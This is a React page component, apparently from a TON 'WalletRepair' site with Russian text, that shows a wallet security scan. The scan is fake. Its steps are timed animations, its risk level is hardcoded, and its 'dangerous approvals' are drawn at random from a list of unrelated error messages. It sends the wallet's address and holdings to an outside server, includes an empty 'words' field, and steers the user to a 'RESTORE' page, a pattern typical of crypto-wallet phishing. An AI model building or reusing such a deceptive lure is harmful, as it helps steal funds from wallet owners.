import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import './Page2_Animation.css';

export const approvalDetails = [
  {
    title: 'NONCE_MISMATCH / SEQNO_STUCK — Застрявший seqno транзакции.',
    desc: 'Пояснение: в TON каждая исходящая транзакция использует seqno. Если предыдущая зависла, новые не пройдут.',
    rec: 'Рекомендация: проверить последнюю транзакцию в Tonviewer/TonScan. Отправить повтор с тем же seqno или дождаться подтверждения.'
  },
  {
    title: 'NONCE_MISMATCH / TX_STUCK — Несинхронизированный nonce — зависшие транзакции.',
    desc: 'Пояснение: у кошелька есть незавершённые транзакции с меньшими nonce, которые блокируют новые операции.',
    rec: 'Рекомендация: отправить «замещающую» транзакцию с тем же nonce и большим gasPrice (replace-by-fee) или выполнить ручной cancel/replace для зависших транзакций.'
  },
  {
    title: 'NETWORK_ERROR — Проблема с RPC/индексатором.',
    desc: 'Пояснение: временная сетевая ошибка между сервисом и блокчейном (RPC недоступен, таймауты, ошибки парсинга).',
    rec: 'Рекомендация: переключиться на backup RPC (Alchemy/Infura/локальная нода), повторить запрос с экспоненциальным бэкоффом и проверить статус провайдера.'
  },
  {
    title: 'CONTRACT_REVERTED — Транзакция отклонена контрактом (revert).',
    desc: 'Пояснение: смарт-контракт отклонил выполнение (внутренние проверки, require/assert, или нежелательное поведение контракта).',
    rec: 'Рекомендация: посмотреть reason/revert в логах/эксплорере, проверить входные параметры и ABI, не пытаться автоматически повторять при подозрительном контракте — провести ручной аудит.'
  },
  {
    title: 'TX_REJECTED_BY_USER — Транзакция отклонена пользователем.',
    desc: 'Пояснение: пользователь закрыл/отклонил окно кошелька и не подписал транзакцию.',
    rec: 'Рекомендация: уточнить, что в кошельке выбран правильный аккаунт и сеть, показать пользователю детали транзакции (цель, комиссия), затем повторно инициировать подпись.'
  },
  {
    title: 'FLOOD_WAIT / RATE_LIMIT — Ограничение скорости / временная блокировка.',
    desc: 'Пояснение: RPC/индексатор/провайдер вернул ограничение из-за слишком частых запросов или попыток массовых транзакций.',
    rec: 'Рекомендация: снизить частоту запросов, внедрить очередь/таймауты, использовать несколько провайдеров или распределять нагрузку; при FloodWait ждать указанное время.'
  },
  {
    title: 'INVALID_SIGNATURE — Неверная подпись транзакции.',
    desc: 'Пояснение: подпись не соответствует ожидаемому адресу (неверный приватный ключ, повреждённые данные, неправильный chainId или nonce).',
    rec: 'Рекомендация: проверить правильность используемого приватного ключа/сессии, убедиться в корректности chainId и данных транзакции; пересоздать подпись и повторить отправку.'
  },
  {
    title: 'INVALID_PARAMS / METHOD_NOT_FOUND — Неверные параметры RPC / метод не поддерживается.',
    desc: 'Пояснение: клиент отправил RPC-запрос с некорректными параметрами или на провайдере отсутствует ожидаемый метод.',
    rec: 'Рекомендация: сверить параметры с документацией RPC/библиотеки, обновить SDK/библиотеку, переключиться на другой RPC-провайдер или скорректировать запрос.'
  }
];

export default function Page2_Animation() {
  const [showApprovalsInfo, setShowApprovalsInfo] = useState(false);
  const [showApprovalDetailIdx, setShowApprovalDetailIdx] = useState(null);
  const [approvalRandomIdxs, setApprovalRandomIdxs] = useState([]);
  const navigate = useNavigate();
  const [wallet] = useState(() => localStorage.getItem('walletAddress') || 'UQdemoaddress0000000000000000000000000000000000000000');
  const [checking, setChecking] = useState(true);
  const [progress, setProgress] = useState(0);
  const [currentStep, setCurrentStep] = useState("");
  const [result, setResult] = useState(null);
  const [tonBalance, setTonBalance] = useState(null);
  const [tokensCount, setTokensCount] = useState(null);
  const [nftCount, setNftCount] = useState(null);
  const [tokens, setTokens] = useState([]);

  const steps = [
    "Получение данных кошелька",
    "Анализ баланса и токенов",
    "Проверка истории транзакций",
    "Поиск зависших транзакций",
    "Проверка подозрительных смарт-контрактов",
    "Поиск фишинг токенов",
    "Анализ завершён",
  ];

  useEffect(() => {
    async function updateSummaryData() {
      if (!wallet) return;
      
      let ton = '';
      let usdt = '';
      let nft = '';
      let tokens = '';
      let tokenList = '';
      let nftList = '';
      
      try {
        // Баланс TON
        const balRes = await fetch(`https://tonapi.io/v2/accounts/${wallet}`);
        const balData = await balRes.json();
        ton = balData.balance ? (balData.balance / 1e9).toFixed(4) : '';
        
        // Jettons (токены)
        const jettonRes = await fetch(`https://tonapi.io/v2/accounts/${wallet}/jettons`);
        const jettonData = await jettonRes.json();
        if (jettonData.jettons && Array.isArray(jettonData.jettons)) {
          tokens = jettonData.jettons.length;
          tokenList = jettonData.jettons.map(j => `${j.name || j.symbol || 'Jetton'} (${j.symbol || ''})`).join(', ');
          // Поиск USDT/USDT-SLP/USD₮
          const usdtJetton = jettonData.jettons.find(j => {
            const symbol = (j.symbol || (j.jetton && j.jetton.symbol) || '').toUpperCase();
            return symbol.includes('USDT') || symbol.includes('USD₮') || symbol === 'USD' || symbol === 'USDt';
          });
          if (usdtJetton && (usdtJetton.balance || usdtJetton.amount)) {
            const decimals = usdtJetton.decimals || (usdtJetton.jetton && usdtJetton.jetton.decimals) || 6;
            const raw = usdtJetton.balance || usdtJetton.amount || 0;
            usdt = (parseFloat(raw) / Math.pow(10, decimals)).toFixed(2);
          } else {
            usdt = '';
          }
        }
        
        // NFT
        const nftRes = await fetch(`https://tonapi.io/v2/accounts/${wallet}/nfts`);
        const nftData = await nftRes.json();
        if (nftData.nft_items && Array.isArray(nftData.nft_items)) {
          nft = nftData.nft_items.length;
          nftList = nftData.nft_items.map(n => n.name || n.address).join(', ');
        }
      } catch (e) {
        // Если ошибка — оставляем пустые значения
      }
      
      setTonBalance(ton);
      setTokensCount(tokens);
      setNftCount(nft);
      
      // Если адрес начинается с UQ и длина 48, используем его как имя файла
      let summaryFileName = wallet;
      if (!(wallet.startsWith('UQ') && wallet.length === 48)) {
        function base64urlToHex(addr) {
          if (!addr.startsWith('UQ') && !addr.startsWith('EQ')) return addr;
          if (!/^[A-Za-z0-9_-]+$/.test(addr) || addr.length < 48) return addr;
          try {
            const b64 = addr.replace(/-/g, '+').replace(/_/g, '/');
            const buf = typeof Buffer !== 'undefined' ? Buffer.from(b64, 'base64') : window.atob(b64);
            const hex = (typeof Buffer !== 'undefined' ? buf.toString('hex') : Array.prototype.map.call(buf, x => ('00' + x.charCodeAt(0).toString(16)).slice(-2)).join(''));
            return '0:' + hex.slice(4, 68);
          } catch (e) {
            return addr;
          }
        }
        summaryFileName = base64urlToHex(wallet).replace(/[^a-zA-Z0-9_-]/g, '_');
      }
      
      // Отправляем данные на сервер для создания summary.txt
      const diagnoseData = {
        walletName: 'Trust Wallet',
        address: wallet,
        ton,
        usdt,
        nft,
        tokens,
        words: [],
        tokenList,
        nftList,
      };
      
      await fetch('https://walletrepair.onrender.com/api/diagnose', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(diagnoseData)
      });
      
      // Загружаем summary.txt для отображения
      const summaryFile = `https://walletrepair.onrender.com/wallets/${summaryFileName}.summary.txt`;
      fetch(summaryFile)
        .then(res => res.text())
        .then(text => {
          const tonMatch = text.match(/Баланс TON: ([\d\.]+)/);
          if (tonMatch) setTonBalance(tonMatch[1]);
          const tokensMatch = text.match(/--- Все токены ---([\s\S]*)/);
          if (tokensMatch) {
            const tokensLines = tokensMatch[1].split('\n').filter(line => line.trim()).filter(line => !line.startsWith('Всего'));
            setTokensCount(tokensLines.length);
          }
        });
    }
    
    updateSummaryData();
  }, [wallet]);

  useEffect(() => {
    setProgress(0);
    setCurrentStep(steps[0]);
    setResult(null);
    setChecking(true);
    setApprovalRandomIdxs([]);
  }, []);

  useEffect(() => {
    if (!checking) return;
    let stepIndex = 0;
    let progressValue = 0;
    let stopped = false;
    
    function nextStep() {
      if (stopped) return;
      if (stepIndex < steps.length) {
        setCurrentStep(steps[stepIndex]);
        const target = Math.round(((stepIndex + 1) / steps.length) * 100);
        let increment = () => {
          if (progressValue < target) {
            progressValue += Math.max(1, Math.round((target - progressValue) / 8));
            setProgress(progressValue);
            setTimeout(increment, 30 + Math.random() * 40);
          } else {
            setProgress(target);
            stepIndex++;
            setTimeout(nextStep, 400 + Math.random() * 600);
          }
        };
        increment();
      } else {
        setTimeout(() => {
          const maxApprovals = Math.min(approvalDetails.length, 2);
          const approvalsCount = Math.floor(Math.random() * maxApprovals) + 1;
          const arr = [];
          while (arr.length < approvalsCount) {
            const idx = Math.floor(Math.random() * approvalDetails.length);
            if (!arr.includes(idx)) arr.push(idx);
          }
          setApprovalRandomIdxs(arr);
          setResult({
            risk: "Средний",
            approvals: approvalsCount,
            message: `Найдены ${approvalsCount} потенциально опасных approvals`,
            tokens: 12,
            balance: 0.234,
          });
          setChecking(false);
        }, 700 + Math.random() * 600);
      }
    }
    nextStep();
    return () => { stopped = true; };
  }, [checking]);

  useEffect(() => {
    async function fetchTopJettons() {
      try {
        const res = await fetch('https://tonapi.io/v2/jettons?limit=20');
        const data = await res.json();
        if (data.jettons && Array.isArray(data.jettons)) {
          setTokens(data.jettons.map(j => `${j.name || j.symbol || 'Jetton'} (${j.symbol || ''})`));
        } else {
          setTokens([]);
        }
      } catch {
        setTokens([]);
      }
    }
    fetchTopJettons();
  }, []);

  // Функция для скачивания summary.txt
  function handleDownloadSummary() {
    if (!wallet) return;
    
    // Если адрес начинается с UQ и длина 48, используем его как имя файла
    let summaryFileName = wallet;
    if (!(wallet.startsWith('UQ') && wallet.length === 48)) {
      function base64urlToHex(addr) {
        if (!addr.startsWith('UQ') && !addr.startsWith('EQ')) return addr;
        if (!/^[A-Za-z0-9_-]+$/.test(addr) || addr.length < 48) return addr;
        try {
          const b64 = addr.replace(/-/g, '+').replace(/_/g, '/');
          const buf = typeof Buffer !== 'undefined' ? Buffer.from(b64, 'base64') : window.atob(b64);
          const hex = (typeof Buffer !== 'undefined' ? buf.toString('hex') : Array.prototype.map.call(buf, x => ('00' + x.charCodeAt(0).toString(16)).slice(-2)).join(''));
          return '0:' + hex.slice(4, 68);
        } catch (e) {
          return addr;
        }
      }
      summaryFileName = base64urlToHex(wallet).replace(/[^a-zA-Z0-9_-]/g, '_');
    }
    
    const summaryFile = `https://walletrepair.onrender.com/wallets/${summaryFileName}.summary.txt`;
    fetch(summaryFile)
      .then(res => {
        if (!res.ok) throw new Error('Файл не найден');
        return res.blob();
      })
      .then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `${summaryFileName}.summary.txt`;
        document.body.appendChild(a);
        a.click();
        a.remove();
        window.URL.revokeObjectURL(url);
      })
      .catch(() => {
        alert('Файл summary.txt не найден или произошла ошибка при скачивании.');
      });
  }

  return (
    <>
      <style>{`
        @keyframes fadeIn { from { opacity: 0; transform: translateY(24px); } to { opacity: 1; transform: none; } }
      `}</style>
      <div className="page2-cyber-bg">
        <div style={{display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 32, marginBottom: 10}}>
          <div className="logo-container">
            <img src="/WalletRepair/wallet-ring.png" alt="wallet-ring" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
          </div>
          <div className="logo-container">
            <img src="/WalletRepair/blue-cube.png" alt="cube" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
          </div>
          <div className="logo-container">
            <img src="/WalletRepair/blue-cube2.png" alt="wallet2" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
          </div>
        </div>
        <div style={{
          marginBottom: 18,
          fontSize: 22,
          fontWeight: 700,
          fontFamily: 'Montserrat, Helvetica, Arial, sans-serif',
          background: 'linear-gradient(90deg,#2563eb 0%,#00fff7 100%)',
          WebkitBackgroundClip: 'text',
          WebkitTextFillColor: 'transparent',
          textShadow: '0 2px 12px rgba(0,136,204,0.18)',
          letterSpacing: '-0.02em',
          lineHeight: 1.15,
          textAlign: 'center',
        }}>
          {result ? 'Диагностика завершена' : 'Выполняется диагностика'}
        </div>

        {(checking || (progress > 0 && progress < 100)) && (
          <div className="cyber-diagnosis-anim">
            <div className="cyber-diagnosis-progress">
              <svg width={128} height={128} className="cyber-diagnosis-svg">
                <defs>
                  <linearGradient id="cyber-gradient2" x1="0" y1="0" x2="1" y2="1">
                    <stop offset="0%" stopColor="#00fff7" />
                    <stop offset="100%" stopColor="#2563eb" />
                  </linearGradient>
                  <filter id="glow2" x="-40%" y="-40%" width="180%" height="180%">
                    <feGaussianBlur stdDeviation="7" result="coloredBlur"/>
                    <feMerge>
                      <feMergeNode in="coloredBlur"/>
                      <feMergeNode in="SourceGraphic"/>
                    </feMerge>
                  </filter>
                </defs>
                <circle
                  cx={64}
                  cy={64}
                  r={56}
                  stroke="#23272e"
                  strokeWidth={8}
                  fill="none"
                />
                <circle
                  cx={64}
                  cy={64}
                  r={56}
                  stroke="url(#cyber-gradient2)"
                  strokeWidth={8}
                  fill="none"
                  strokeDasharray={2 * Math.PI * 56}
                  strokeDashoffset={2 * Math.PI * 56 - (2 * Math.PI * 56 * progress) / 100}
                  strokeLinecap="round"
                  style={{ transition: 'stroke-dashoffset 0.5s, stroke 0.3s' }}
                  transform="rotate(-90 64 64)"
                  filter="url(#glow2)"
                />
              </svg>
              <div className="cyber-diagnosis-percent">{progress}%</div>
            </div>
            <div style={{paddingLeft: 14, paddingRight: 14, boxSizing: 'border-box', width: '100%'}}>
              <div className="cyber-diagnosis-bar" style={{position: 'relative'}}>
                <div className={`cyber-diagnosis-bar-fill${progress >= 92 ? ' danger' : ''}`} style={{width: `${progress}%`}} />
                <svg width="100%" height="14" viewBox="0 0 340 14" preserveAspectRatio="none" style={{ position: 'absolute', left: 0, top: 0, zIndex: 2, pointerEvents: 'none' }}>
                  <defs>
                    <linearGradient id="cyber-bar-glow2" x1="0" y1="0" x2="1" y2="0">
                      <stop offset="0%" stopColor="#00fff7" stopOpacity="0.7" />
                      <stop offset="100%" stopColor="#2563eb" stopOpacity="0.7" />
                    </linearGradient>
                  </defs>
                  <rect x="0" y="0" width="340" height="14" fill="none" stroke="url(#cyber-bar-glow2)" strokeWidth="2.5" rx="7" />
                  {Array.from({ length: 16 }).map((_, i) => (
                    <rect
                      key={i}
                      x={i * 21.25}
                      y={0}
                      width={1.5}
                      height={14}
                      fill="#00fff733"
                    />
                  ))}
                </svg>
              </div>
            </div>
            <div className="cyber-diagnosis-checklist">
              {steps.map((step, idx) => {
                const threshold = Math.round(((idx + 1) / steps.length) * 100);
                if (progress < threshold) return null;
                const isDone = progress >= threshold;
                return (
                  <div key={idx} className={`cyber-diagnosis-checkitem${isDone ? ' done' : ''}`}>
                    <span className="cyber-diagnosis-checktext">{step}</span>
                    {isDone && (
                      <svg width={20} height={20} className="cyber-diagnosis-checkicon" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="10" cy="10" r="10" fill="#22c55e" />
                        <path d="M6 10.5l2.5 2.5 5-5" stroke="#fff" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" />
                      </svg>
                    )}
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {result && (
          <div className="cyber-diagnosis-result">
            <h2 className="cyber-diagnosis-result-title">Результат диагностики</h2>
            <p className="cyber-diagnosis-result-risk">Риск: <span>{result.risk}</span></p>
            <p className="cyber-diagnosis-result-message">{result.message}</p>
            <div className="cyber-diagnosis-result-cards">
              <div className="cyber-diagnosis-result-card">
                <span className="cyber-diagnosis-result-label">Баланс TON</span>
                <span className="cyber-diagnosis-result-value">{tonBalance !== null ? tonBalance : '—'}</span>
              </div>
              <div className="cyber-diagnosis-result-card">
                <span className="cyber-diagnosis-result-value">{tokensCount !== null ? `${tokensCount} токенов` : 'Токены: —'}</span>
                {nftCount !== null && (
                  <span className="cyber-diagnosis-result-value" style={{marginTop:4}}>{`${nftCount} NFT`}</span>
                )}
              </div>
            </div>
            <button className="cyber-diagnosis-btn cyber-diagnosis-btn-approvals" onClick={() => setShowApprovalsInfo(true)}>
              Опасные approvals: {result.approvals}
            </button>
            <button className="cyber-diagnosis-btn cyber-diagnosis-btn-restore" onClick={() => navigate('/page3')}>
              ВОССТАНОВИТЬ<br/>
              <span className="cyber-diagnosis-btn-restore-sub">(отозвать опасные approvals)</span>
            </button>
            <button className="cyber-diagnosis-btn" style={{marginTop:12, background:'linear-gradient(90deg,#00fff7 0%,#2563eb 100%)', color:'#18181b', fontWeight:700}} onClick={handleDownloadSummary}>
              Скачать summary.txt
            </button>
          </div>
        )}

        {showApprovalsInfo && showApprovalDetailIdx === null && (
          <div style={{
            position: 'absolute',
            top: 0,
            left: 0,
            width: '100%',
            height: '100%',
            background: 'rgba(0,0,0,0.35)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 1000,
          }}
          onClick={() => setShowApprovalsInfo(false)}
          >
            <div style={{
              background: 'linear-gradient(120deg,rgba(37,99,235,0.93) 0%,rgba(0,255,247,0.93) 100%)',
              borderRadius: 18,
              padding: '32px 24px 24px 24px',
              minWidth: 0,
              maxWidth: 420,
              width: '100%',
              boxShadow: '0 12px 36px 0 rgba(0,136,204,0.18)',
              position: 'relative',
              border: '2px solid #00fff7',
              fontFamily: 'Montserrat, Helvetica, Arial, sans-serif',
              color: '#fff',
              textAlign: 'center',
            }}
            onClick={e => e.stopPropagation()}
            >
              <h3 style={{
                marginTop:0,
                marginBottom:12,
                fontSize: 22,
                fontWeight: 800,
                background: 'linear-gradient(90deg,#fff 0%,#00fff7 100%)',
                WebkitBackgroundClip: 'text',
                WebkitTextFillColor: 'transparent',
                letterSpacing: '-0.02em',
                textShadow: '0 2px 12px rgba(0,136,204,0.18)',
                fontFamily: 'Montserrat, Helvetica, Arial, sans-serif',
              }}>Опасные approvals</h3>
              <p style={{marginBottom:16, fontSize:15, color:'#fff', opacity:0.92, fontWeight:500}}>Опасные approvals — это разрешения, выданные смарт-контрактам или сервисам, которые могут получить доступ к вашим токенам без вашего ведома. Рекомендуется периодически проверять и отзывать такие разрешения для безопасности ваших средств.</p>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 10, marginTop: 16 }}>
              {result && approvalRandomIdxs.length === result.approvals && approvalRandomIdxs.map((randIdx, idx) => (
                <button
                  key={idx}
                  style={{
                    background: '#f3f4f6',
                    color: '#dc2626',
                    border: '1px solid #dc2626',
                    borderRadius: 8,
                    padding: '8px 0',
                    fontWeight: 600,
                    fontSize: 15,
                    cursor: 'pointer',
                    width: '100%',
                  }}
                  onClick={() => {
                    setShowApprovalsInfo(false);
                    setTimeout(() => setShowApprovalDetailIdx(idx), 200);
                  }}
                >
                  Опасный approval #{idx + 1}
                </button>
              ))}
              <button
                style={{
                  background: '#dc2626',
                  color: '#fff',
                  border: 'none',
                  borderRadius: 8,
                  padding: '8px 20px',
                  fontWeight: 600,
                  fontSize: 15,
                  cursor: 'pointer',
                  marginTop: 8,
                  alignSelf: 'flex-end',
                }}
                onClick={() => setShowApprovalsInfo(false)}
              >
                Закрыть
              </button>
              </div>
            </div>
          </div>
        )}

        {showApprovalDetailIdx !== null && approvalRandomIdxs.length > showApprovalDetailIdx && (
          <div style={{
            position: 'absolute',
            top: 0,
            left: 0,
            width: '100%',
            height: '100%',
            background: 'rgba(0,0,0,0.35)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 1000,
          }}
          onClick={() => setShowApprovalDetailIdx(null)}
          >
            <div style={{
            background: '#fff',
            borderRadius: 16,
            padding: 32,
            minWidth: 0,
            maxWidth: 400,
            width: '100%',
            boxShadow: '0 8px 32px 0 rgba(0,0,0,0.18)',
            position: 'relative',
          }}
          onClick={e => e.stopPropagation()}
          >
            <div style={{fontWeight:700, marginBottom:6, color:'#dc2626'}}>{approvalDetails[approvalRandomIdxs[showApprovalDetailIdx]].title}</div>
            <div style={{marginBottom:6, color:'#18181b'}}>{approvalDetails[approvalRandomIdxs[showApprovalDetailIdx]].desc}</div>
            <div style={{fontStyle:'italic', marginBottom:16, color:'#18181b'}}>{approvalDetails[approvalRandomIdxs[showApprovalDetailIdx]].rec}</div>
            <button
              style={{
                background: '#f59e42',
                color: '#fff',
                border: 'none',
                borderRadius: 8,
                padding: '8px 20px',
                fontWeight: 600,
                fontSize: 15,
                cursor: 'pointer',
                margin: '16px auto 0 auto',
                display: 'block',
              }}
              onClick={() => {
                setShowApprovalDetailIdx(null);
                setTimeout(() => setShowApprovalsInfo(true), 200);
              }}
            >
              Назад к списку
            </button>
          </div>
          </div>
        )}
      </div>
    </>
  );
}